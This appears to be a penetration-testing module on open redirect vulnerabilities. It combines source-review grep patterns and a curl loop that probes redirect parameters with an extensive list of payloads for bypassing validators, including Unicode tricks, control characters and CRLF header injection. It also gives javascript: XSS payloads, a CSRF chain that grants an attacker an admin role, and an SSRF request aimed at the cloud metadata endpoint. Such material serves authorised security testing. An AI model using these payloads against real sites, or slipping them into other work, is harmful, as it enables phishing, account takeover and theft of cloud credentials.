# VULN MODULE — Open Redirect
# Asset: webapp
# CWE-601 | Report prefix: WEB-REDIR

## THREAT MODEL

Open redirects allow attackers to craft URLs on trusted domains that redirect
users to attacker-controlled sites. Used for:
- Phishing (trusted domain → fake login page)
- OAuth token theft (redirect_uri abuse)
- SSRF chain (server follows redirect to internal IP)
- XSS escalation (client-side redirect sinks accept `javascript:` URLs)
- CSRF chaining (open redirect → GET-based state-changing endpoint)
- Bypassing referrer-based access controls

## WHERE TO LOOK

High-yield locations for redirect parameters:
- Sign in / register pages (`?next=`, `?return_to=`, `?redirect=`)
- Sign out / logout routes (`?redirect_url=`)
- Password reset links (check token URL for embedded redirect)
- Email verification links
- OAuth flows (`redirect_uri=`)
- Error pages (may redirect back to referrer)
- Multi-step actions that redirect between steps

## WHITEBOX PATTERNS

```bash
grep -rn "redirect(\|header.*Location\|Redirect(\|redirect_to" \
  --include="*.php" --include="*.py" --include="*.rb" --include="*.java"

grep -rn "next=\|return_to=\|redirect=\|url=\|goto=\|dest=\|destination=" \
  --include="*.php" --include="*.py" --include="*.js"

# Check for URL validation (or lack thereof)
grep -rn "parse_url\|urlparse\|URI\.parse\|URL\.parse" \
  --include="*.php" --include="*.py" --include="*.rb" --include="*.js" -A5
```

## TESTING

```bash
# Common parameter names for redirect destinations:
PARAMS="next return_to redirect redirect_uri url goto dest destination back callback"

for param in $PARAMS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/login?$param=https://attacker.com")
  location=$(curl -sI "https://target.com/login?$param=https://attacker.com" | \
    grep -i "location:" | tr -d '\r')
  if echo "$location" | grep -q "attacker.com"; then
    echo "REDIRECT FOUND: ?$param= → $location"
  fi
done
```

## BYPASS TECHNIQUES

```bash
# When simple https://attacker.com is blocked:
//attacker.com                    # protocol-relative
///attacker.com                   # triple slash
/\attacker.com                    # backslash (IE/Edge interpret as /)
https:attacker.com                # missing //
https:/attacker.com               # single slash
https:example.com                 # authority bypass (no slashes)
https://target.com@attacker.com   # credentials confusion
https://attacker.com#target.com   # fragment
https://attacker.com%2Ftarget.com # encoded /
https://attacker.com?target.com   # parameter confusion
https://attacker.com/.target.com  # dot after hostname

# Whitespace / control char in PATH segment (not scheme) — validator may strip char
/%0A/attacker.com                 # newline in path
/%0D/attacker.com                 # carriage return in path
/%09/attacker.com                 # tab in path
/+/attacker.com                   # plus in path

# Scheme-level bypass (tab/newline in scheme confuses some validators)
http\t://attacker.com             # tab in scheme
h\nttp://attacker.com             # newline in scheme
http:                             # scheme only

# Credential injection
//attacker.com@allowed.com        # validator may read host as allowed.com

# Unicode / IDN homograph
https://аttacker.com              # Cyrillic а
https://attacker.com              # full-width chars

# URL-splitting Unicode (normalize to special chars — bypass regex validators)
# These characters normalize to or visually resemble URL delimiters:
# U+FF1A (：) → colon     U+FE55 (﹕) → colon     U+2A74 (⩴) → ::
# U+FF1F (？) → ?         U+2049 (‽) → ?!          U+2048 (⁈) → ?
# U+FF0E (．) → .         U+2024 (․) → .
# U+FF0F (／) → /         U+2215 (∕) → /
# U+FF20 (＠) → @
# U+FF03 (＃) → #
# Example: use ： instead of : in scheme → passes validator, browser normalizes
https：//attacker.com
javascript：alert(1)

# Null byte / control chars after hostname
https://attacker.com%00.target.com
https://attacker.com%0Atarget.com
https://attacker.com%0Dtarget.com
https://attacker.com%09target.com

# TLD validation bypasses (validator checks .com suffix, misses extra chars)
https://example.comattacker.com   # no dot — passes suffix check
https://example.com.mx            # attacker owns .mx domain
https://example.company           # attacker owns .company TLD
https://attacker.com%E3%80%82example.com  # Unicode ideographic full stop (。) as dot

# Invisible Unicode bypass (validator skips non-rendering chars)
https://\u200battacker.com        # U+200B Zero Width Space
https://\u00adattacker.com        # U+00AD Soft Hyphen
https://\u2060attacker.com        # U+2060 Word Joiner

# HTML entity bypass (some validators decode entities, miss the redirect)
&bsol;/attacker.com               # &bsol; = backslash
&sol;/attacker.com                # &sol; = forward slash

# CRLF in redirect (HTTP response splitting)
/redirect?url=https://attacker.com%0d%0aSet-Cookie:%20malicious=1
```

## DOM-BASED XSS ESCALATION

When the redirect target is consumed by a **client-side** JavaScript sink
(`window.location.href = param`, `location.assign(param)`, etc.), the `javascript:`
protocol may execute arbitrary JS — escalating from redirect to XSS:

```
javascript:alert(1)
JavaScript:alert(1)          # case variation
JAVASCRIPT:alert(1)

# Whitespace/control chars inside the keyword bypass regex filters:
ja%20vascri%20pt:alert(1)   # space
jav%0Aascri%0Apt:alert(1)   # newline
jav%0Dascri%0Dpt:alert(1)   # carriage return
jav%09ascri%09pt:alert(1)   # tab

# Prepend control char (some parsers skip leading non-printable bytes):
%19javascript:alert(1)

# Comment-based (JS executes after // + newline):
javascript://%0Aalert(1)
javascript://%0Dalert(1)
javascript://https://example.com%0Aalert(1)
```

Detection tools: **DOMInvader** (PortSwigger), **Untrusted Types** (GitHub)

## ATTACK CHAINS

### CSRF via open redirect
If a GET request to an internal endpoint changes state, chain through the redirect:
```
GET /redirect?url=%2Fapi%2Faccount%2Fprofile%3Fusername%3Dattacker%26role%3Dadmin HTTP/1.1
```
Decoded: redirects to `/api/account/profile?username=attacker&role=admin`
The server follows the redirect as the victim's session → state-changing GET CSRF.

### SSRF via open redirect (double-encoded)
Server-side image loaders / URL fetchers often follow redirects:
```
GET /api/image-loader?url=https%3A%2F%2Fexample.com%2Fredirect%3Furl%3Dhttp%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252F
```
The outer fetch hits `example.com/redirect`, which redirects to the inner (double-encoded)
`http://169.254.169.254/...` — reaching the cloud metadata endpoint.

## SEVERITY NOTE

Standalone open redirect = Low/Medium
Open redirect → XSS (`javascript:`) = High (account takeover)
Open redirect + OAuth token theft = High
Open redirect + CSRF chain = Medium/High
Open redirect + SSRF chain = Critical
Open redirect used in active phishing campaign = Medium/High
